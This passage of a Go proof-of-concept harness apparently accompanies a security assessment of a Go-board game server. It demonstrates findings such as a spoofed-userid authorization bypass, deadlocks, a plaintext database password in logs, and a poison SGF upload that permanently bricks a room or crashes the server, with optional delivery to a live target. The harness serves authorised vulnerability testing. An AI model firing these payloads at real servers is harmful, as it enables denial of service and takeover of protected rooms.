	fmt.Printf(">> after %d unauthenticated grafts: tree grew to %d nodes (no cap); the serialized SGF is %d bytes.\n", k, nodes, sgfLen)
	fmt.Println(">> GenerateFullFrame walks all N nodes and is regenerated + broadcast to every client on EVERY graft")
	fmt.Println(">> (broadcastFullFrameAfter) -> O(k^2) work and unbounded memory; the persisted SGF inflates every Save/Load.")
}

// coordIdx maps 0..360 to a valid board coordinate (19x19, letters skip 'i').
func coordIdx(n int) string {
	letters := "abcdefghjklmnopqrst" // 19 letters, no 'i'
	n = ((n % 361) + 361) % 361
	return fmt.Sprintf("%c%d", letters[n/19], n%19+1)
}

// GL-1 (covers H-8 root): Room.Close() never ends registered plugins, so plugin
// goroutines/fds leak on room teardown. Demonstrated with a MockPlugin: after
// Close(), the plugin was never End()ed.
func pocGL1() {
	banner("gl1", "Room.Close never ends plugins -> goroutine/fd leak (root of H-8)")
	r := room.NewRoom("gl1")
	r.SetLogger(logx.NewDefaultLogger(logx.LogLevelError))
	mp := plugin.NewMockPlugin()
	r.RegisterPlugin(mp, map[string]any{"key": "ogs"})
	fmt.Printf("plugin started: %v\n", mp.IsStarted)
	_ = r.Close() // teardown path used by the Heartbeat on idle expiry
	fmt.Printf("after Room.Close(): plugin still started (End NOT called): %v\n", mp.IsStarted)
	if mp.IsStarted {
		fmt.Println(">> CONFIRMED: Close() closes conns but never iterates r.plugins/p.End().")
		fmt.Println(">> For the real OGS plugin this leaks loop/ping/readSocketToChan goroutines + a TCP fd,")
		fmt.Println(">> pinning the whole room object graph. (H-8's socket-close needs OGS egress to fully exercise.)")
	}
}

// DL-1: the hub holds h.mu across a room call that needs a pinned r.mu, so a
// stuck client + a broadcast freezes the whole hub (new rooms/board loads wedge).
func pocDL1() {
	banner("dl1", "Hub freeze: h.mu held across a room call blocked by a stuck client")
	h, err := hub.NewHub(config.Test(), logx.NewDefaultLogger(logx.LogLevelError))
	if err != nil {
		fmt.Println("hub error:", err)
		return
	}
	r := room.NewRoom("stuckroom")
	stuck := &blockingWriter{EventChannel: evpkg.NewMockEventChannel(), block: make(chan struct{})}
	defer close(stuck.block)
	r.RegisterConnection(stuck)
	h.SetRoom("stuckroom", r)

	go r.Broadcast(evpkg.NewEvent("global", "x")) // pins r.mu on the stuck write
	time.Sleep(150 * time.Millisecond)
	go h.ConnCount() // locks h.mu, then calls r.NumConns() -> blocks WHILE holding h.mu
	time.Sleep(150 * time.Millisecond)

	done := make(chan struct{})
	go func() { _ = h.GetOrCreateRoom("brand-new"); close(done) }() // needs h.mu
	select {
	case <-done:
		fmt.Println("GetOrCreateRoom completed — hub NOT frozen (unexpected)")
	case <-time.After(1 * time.Second):
		fmt.Println(">> CONFIRMED: GetOrCreateRoom blocked ~1s — one stuck client + an unauth GET /api/stats")
		fmt.Println(">> (ConnCount) pins h.mu, wedging all new connections and board loads hub-wide.")
	}
}

// AZ-1: /api/v1 takes evt.User() from the client JSON `userid` (never SetUser),
// and `authorized` checks GetAuth(that id). Replaying a known-authed id runs
// privileged handlers on a password-protected room with no password.
func pocAZ1() {
	banner("az1", "/api/v1 trusts client userid -> authz bypass / password-room takeover")
	r := room.NewRoom("az1")
	r.SetPassword(core.Hash("the-secret"))
	owner := "owner-conn-uuid" // harvested from the connected_users broadcast
	r.SetAuth(owner, true)     // owner authenticated (passed checkpassword)

	// Privileged action: update_settings (authorized-gated, and NOT rate-gated by
	// outsideBuffer). Keep the same password so the room stays protected; change the
	// input buffer as an observable side effect.
	privileged := func(user string, buffer int) {
		e := evpkg.NewEvent("update_settings", settingsVal(buffer, "the-secret"))
		e.SetUser(user)
		r.HandleAny(e)
	}

	// attacker id NOT in auth -> authorized blocks it
	privileged("random-attacker", 9999)
	fmt.Printf("update_settings as un-authed id: buffer -> %d  => %s\n", r.GetInputBuffer(),
		map[bool]string{true: "BLOCKED (auth works)", false: "changed"}[r.GetInputBuffer() != 9999])

	// attacker replays the owner's UUID — exactly the client-supplied `userid` that
	// apiv1router feeds to HandleAny with no SetUser -> authorized passes
	privileged(owner, 7777)
	fmt.Printf("update_settings as spoofed owner UUID: buffer -> %d  => %s\n", r.GetInputBuffer(),
		map[bool]string{true: ">> BYPASS: privileged action ran on a password room via a spoofed userid", false: "no change"}[r.GetInputBuffer() == 7777])
}

// AZ-2: enabling a password calls SetAuthAll(), grandfathering every currently
// connected socket — including one that idled since the room was open.
func pocAZ2() {
	banner("az2", "Enabling a password grandfathers all connected (incl. hostile) sockets")
	r := room.NewRoom("az2")
	owner := &blockingWriterNB{evpkg.NewMockEventChannel()}
	attacker := &blockingWriterNB{evpkg.NewMockEventChannel()}
	ownerID := r.RegisterConnection(owner)
	attackerID := r.RegisterConnection(attacker) // idling since the room was open

	fmt.Printf("before password: attacker authed = %v\n", r.GetAuth(attackerID))
	// owner (allowed, room still open) sets a password
	us := evpkg.NewEvent("update_settings", settingsVal(250, "the-secret"))
	us.SetUser(ownerID)
	r.HandleAny(us)
	fmt.Printf("after owner sets password: attacker authed = %v  => %s\n", r.GetAuth(attackerID),
		map[bool]string{true: ">> BYPASS: the idling attacker was grandfathered by SetAuthAll", false: "correctly not authed"}[r.GetAuth(attackerID)])
}

// blockingWriterNB is a non-blocking mock channel (SendEvent always returns nil).
type blockingWriterNB struct{ evpkg.EventChannel }

func (b *blockingWriterNB) SendEvent(evpkg.Event) error { return nil }

// CS-1: dbConfig.redact() is a no-op, so Config.Redact() leaves the Postgres DSN
// (with password) intact; cmd/main.go logs it in plaintext at startup.
func pocCS1() {
	banner("cs1", "Postgres DSN (password) survives Redact() and is logged in plaintext")
	dir, err := os.MkdirTemp("", "cs1")
	if err != nil {
		fmt.Println("tmp error:", err)
		return
	}
	defer os.RemoveAll(dir) //nolint:errcheck
	cfgPath := dir + "/c.yaml"
	dsn := "postgres://board_user:SuperSecretPw@db:5432/board?sslmode=disable"
	_ = os.WriteFile(cfgPath, []byte("db:\n  type: postgres\n  path: \""+dsn+"\"\n"), 0o600)

	cfg, err := config.New(cfgPath)
	if err != nil {
		fmt.Println("config error:", err)
		return
	}
	safe := *cfg
	safe.Redact() // exactly what cmd/main.go does before logging
	logged := fmt.Sprintf("%v", safe)
	fmt.Printf("what cmd/main.go logs after Redact():\n  %s\n", logged)
	if strings.Contains(logged, "SuperSecretPw") {
		fmt.Println(">> CONFIRMED: the DB password appears in the redacted config -> written to logs at startup.")
		fmt.Println(">> (Twitch secret IS redacted; dbConfig.redact() is an empty no-op.)")
	} else {
		fmt.Println("password not present (unexpected)")
	}
}

// =========================================================================
// SECOND PASS (new findings) — see SECURITY_ASSESSMENT.md §10
// =========================================================================

// P2-B1: colon-less LB label = persistent poison-pill (unrecoverable board).
// CONFIRMED: FromSGF accepts LB[z] (no colon) and UploadSGF commits the state
// BEFORE frame generation; GenerateFullFrame then panics at frame.go:131
// (text := spl[1]). The poison is persisted (ToSGFIX writes LB[z] back and
// Hub.Save stores it), so on every reload the room loads clean then panics on
// the first join -> the board is permanently unjoinable (bricked). The per-join
// panic is in the request goroutine (recovered -> server survives), but the
// ROOM is unrecoverable; if the room has the OGS plugin active it escalates to a
// whole-server crash (generateMarks runs in the OGS goroutine).
func pocB1() {
	banner("b1", "Colon-less LB label = persistent poison-pill (unrecoverable board)")
	sgf := "(;GM[1]FF[4]SZ[19]LB[z])" // LB value has NO colon
	b64 := base64.StdEncoding.EncodeToString([]byte(sgf))
	fmt.Printf("poison SGF: %s\n", sgf)
	fmt.Printf("unauthenticated e2e: POST /api/v1/room/{id}  {\"event\":\"upload_sgf\",\"value\":%q}\n", b64)
	if target != "" {
		body := event("upload_sgf", fmt.Sprintf("%q", b64))
		resp, err := http.Post("http://"+target+"/api/v1/room/poc-b1", "application/json", strings.NewReader(body))
		if err == nil {
			_ = resp.Body.Close()
			fmt.Printf("upload response: %s (state now committed+poisoned)\n", resp.Status)
			fmt.Println(">> now try to open ws /socket/b/poc-b1 — the join panics on GenerateFullFrame;")
			fmt.Println(">> the room is bricked and, once persisted, stays bricked across restarts.")
		}
	}
	// local proof of the exact panic:
	s, err := state.FromSGF(sgf)
	if err != nil {
		fmt.Println("FromSGF err (unexpected):", err)
		return
	}
	fmt.Println("FromSGF OK — poisoned state committed")
	func() {
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf(">> GenerateFullFrame PANIC: %v\n", r)
				fmt.Println(">> every join re-triggers this; persisted -> board permanently unjoinable.")
			}
		}()
		_ = s.GenerateFullFrame(state.Full)
		fmt.Println("no panic (unexpected)")
	}()
}

// P2-A1: Board.Set nil/out-of-bounds -> whole-server crash via the OGS review
// plugin goroutine. CONFIRMED: Board.Set (board.go:127) has no nil/bounds guard,
// and Legal() calls the guarded Get() first (returns Empty for off-board, so the
// move is NOT rejected) then the unguarded Set(). An OGS review whose moves are
// off-board/pass feed Board.Move from inside `go o.loop()` (ogs.go:198) — a
// spawned goroutine net/http does NOT recover -> whole process aborts.
// Delivery e2e needs an attacker-authored online-go.com review + request_sgf;
// this local call proves the fatal panic the goroutine would suffer.
func pocA1() {
	banner("a1", "Board.Set nil/OOB -> whole-server crash via OGS review goroutine (not recovered)")
	fmt.Println("e2e (unauth): create an online-go.com review with an off-board/pass move, then send")
	fmt.Println("  {\"event\":\"request_sgf\",\"value\":\"https://online-go.com/review/<id>\"} to a password-less room.")
	fmt.Println("  The move is parsed and played in `go o.loop()` (ogs.go:198) — a goroutine outside net/http's recover.")
	for _, tc := range []struct {
		name string
		c    *coord.Coord
	}{
		{"off-board (1000,1000)", coord.NewCoord(1000, 1000)},
		{"negative (-1,-1)", coord.NewCoord(-1, -1)},
	} {
		func() {
			defer func() {
				if r := recover(); r != nil {
					fmt.Printf(">> [%s] PANIC in Board.Move: %v\n", tc.name, r)
				}
			}()
			b := board.NewBoard(19)
			b.Move(tc.c, color.Black) // Legal -> Get (guarded, passes) -> Set (UNGUARDED) -> panic
			fmt.Printf("[%s] no panic (unexpected)\n", tc.name)
		}()
	}
	fmt.Println(">> In the OGS goroutine this panic is UNRECOVERED -> the whole server crashes.")
}

// =========================================================================

func roomCount() int { return statField("rooms") }
func connCount() int { return statField("connections") }

func statField(field string) int {
	requireTarget()
	resp, err := (&http.Client{Timeout: 3 * time.Second}).Get("http://" + target + "/api/stats")
	if err != nil {
		return -1
	}
	defer resp.Body.Close() //nolint:errcheck
	b, _ := io.ReadAll(resp.Body)
	// tiny hand parse to avoid pulling in the event types
	s := string(b)
	key := `"` + field + `":`
	i := strings.Index(s, key)
	if i < 0 {
		return -1
	}
	j := i + len(key)
	n := 0
	for j < len(s) && s[j] >= '0' && s[j] <= '9' {
		n = n*10 + int(s[j]-'0')
		j++
	}
	return n
}

var pocs = []struct {
	id, title string
	run       func()
}{
	{"c1", "update_settings type-assertion panic (recovered by net/http -> Medium)", pocC1},
	{"c2", "GIB coordinate index panic (recovered by net/http -> Medium)", pocC2},
	{"c3", "Board-size memory exhaustion (CONFIRMED)", pocC3},
	{"c4", "No max message size + no read deadline (was 'instant 4GB' -> corrected)", pocC4},
	{"c5", "ZIP bomb (CONFIRMED)", pocC5},
	{"c6", "Deeply nested SGF stack overflow (CONFIRMED whole-server crash)", pocC6},
	{"c7", "Unauthenticated HTTP API control + crash delivery (CONFIRMED)", pocC7},
	{"h1", "No WebSocket Origin check / CSWSH (CONFIRMED)", pocH1},
	{"h2", "Unbounded room creation (CONFIRMED)", pocH2},
	{"h3", "No connection limits / rate limiting (CONFIRMED)", pocH3},
	{"h4", "No read timeout / slow-loris", pocH4},
	{"h5", "Twitch HMAC bypass on empty secret (CONFIRMED)", pocH5},
	{"h6", "NGF/SGF board size — MITIGATED, not exploitable (see C-3)", pocH6},
	{"h7", "Tree toSGF stack overflow (CONFIRMED whole-server crash, elevated to Critical)", pocH7},
	{"b1", "[pass2] Colon-less LB label poison-pill — unrecoverable board (CONFIRMED)", pocB1},
	{"a1", "[pass2] Board.Set nil/OOB via OGS goroutine — whole-server crash (CONFIRMED)", pocA1},
	{"m2", "[medium] Unbounded HTTP request body", pocM2},
	{"m3", "[medium] /debug leaks room state unauthenticated (CONFIRMED)", pocM3},
	{"m4", "[medium] SSRF: fetch follows redirects, no timeout (CONFIRMED)", pocM4},
	{"m5", "[medium] Twitch challenge echoed before verify (CONFIRMED)", pocM5},
	{"m7", "[medium] coord/board OOB panic — recovered in request path (CONFIRMED)", pocM7},
	{"dr1", "[ext] Concurrent map race on r.nicks via /api/v1 — fatal crash (CONFIRMED)", pocDR1},
	{"dl2", "[ext] Slow-reader freezes whole room (lock held during ws write) (CONFIRMED)", pocDL2},
	{"cs2", "[ext] >72-byte password silently disables protection (CONFIRMED)", pocCS2},
	{"graft", "[High H-6] graft bypasses authorized middleware on a password room (CONFIRMED)", pocH6graft},
	{"grow", "[High H-7] Unbounded tree growth + quadratic full-frame rebroadcast (CONFIRMED)", pocH7grow},
	{"gl1", "[High] Room.Close never ends plugins -> leak (root of H-8) (CONFIRMED)", pocGL1},
	{"dl1", "[High] Hub freeze: h.mu held across a room call blocked by a stuck client (CONFIRMED)", pocDL1},
	{"az1", "[High] /api/v1 trusts client userid -> password-room takeover (CONFIRMED)", pocAZ1},
	{"az2", "[High] Enabling a password grandfathers connected sockets (CONFIRMED)", pocAZ2},
	{"cs1", "[High] Postgres DSN logged in plaintext (Redact no-op) (CONFIRMED)", pocCS1},
}

func usage() {
	fmt.Println("golab/board security PoC harness")
	fmt.Println("usage: go run ./security/poc/harness <finding-id> [-target host:port] [-origin url]")
	fmt.Println("\nfindings:")
	for _, p := range pocs {
		fmt.Printf("  %-4s %s\n", p.id, p.title)
	}
	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7 a1 b1 m4 m7 dl2 cs2 graft grow gl1 dl1 az1 az2 cs1  (h6 verifies a mitigation)")
	fmt.Println("need -target (live disposable instance): c1 c3 c4 c7 h1 h2 h3 h4 h5 m2 m3 m5 dr1")
	fmt.Println("b1 also runs e2e when -target is given (uploads the poison, then you join to brick it)")
	fmt.Println("\nWARNING: several PoCs crash or exhaust the target. Authorised local testing only.")
}

func main() {
	if len(os.Args) < 2 {
		usage()
		return
	}
	id := strings.ToLower(os.Args[1])
	_ = parseCommon(os.Args[2:])
	for _, p := range pocs {
		if p.id == id {
			p.run()
			return
		}
	}
	fmt.Println("unknown finding id:", id)
	usage()
	os.Exit(2)
}
